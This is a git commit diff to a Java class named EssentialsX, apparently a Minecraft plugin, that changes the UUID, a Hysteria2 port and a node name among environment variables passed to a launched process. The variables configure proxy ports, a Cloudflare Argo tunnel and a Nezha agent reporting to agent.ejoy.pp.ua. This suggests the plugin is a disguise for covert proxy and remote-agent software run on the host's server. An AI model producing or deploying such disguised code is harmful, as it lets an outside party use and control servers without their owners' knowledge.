361e5e019caa9a4190723d79486811b18d10c94a
huanthree <141692838+huanthree@users.noreply.github.com>
2026-02-24 15:26:49 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "df09b816-ba6c-4147-9b53-3fac4a3642d2");
+        env.put("UUID", "2337fadb-dc7d-42da-8177-5520f0ae1d4f");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "agent.ejoy.pp.ua:80");
         env.put("NEZHA_PORT", "");
@@ -82,7 +82,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "20445");
+        env.put("HY2_PORT", "25694");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "greathost.es");
+        env.put("NAME", "weird-blove");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
